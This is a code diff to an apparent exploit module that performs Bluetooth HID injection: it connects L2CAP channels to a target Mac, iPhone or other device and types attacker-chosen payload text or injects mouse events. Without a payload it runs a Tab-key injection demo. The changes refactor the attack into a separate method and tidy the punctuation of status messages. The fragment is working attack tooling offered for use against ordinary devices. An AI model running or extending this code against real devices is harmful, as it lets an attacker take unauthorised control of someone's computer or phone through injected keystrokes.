@@ -581,7 +581,10 @@ class Exploit(Exploit):
                            broadcom_fallback=is_broadcom)
 
         print_status(f"Connecting to {self.target_address} ({self.target_os})...")
+        self._exploit()
 
+    def _exploit(self) -> None:
+        """E2E BT HID injection: connect L2CAP channels, inject keystrokes/mouse events."""
         client = HIDKeyboardClient(self.target_address)
         if not client.connect(self.connect_timeout):
             print_error("Failed to establish HID connections.")
@@ -590,7 +593,7 @@ class Exploit(Exploit):
         print_status("Waiting for HID channel readiness...")
         if self.target_os in ("macos", "ios"):
             if not client.wait_ready(30.0):
-                print_info("HID ready signal not received — attempting injection anyway.")
+                print_info("HID ready signal not received: attempting injection anyway.")
         else:
             time.sleep(2.0)
             client.hid_ready = True
@@ -603,7 +606,7 @@ class Exploit(Exploit):
                     client.type_string(self.payload_text, self.key_delay)
                     print_success(f"Typed {len(self.payload_text)} characters.")
                 else:
-                    print_info("No payload_text — running Tab injection demo (5s).")
+                    print_info("No payload_text: running Tab injection demo (5s).")
                     self._inject_demo_tabs(client, 5.0)
 
             if self.hid_mode in ("mouse", "combo"):
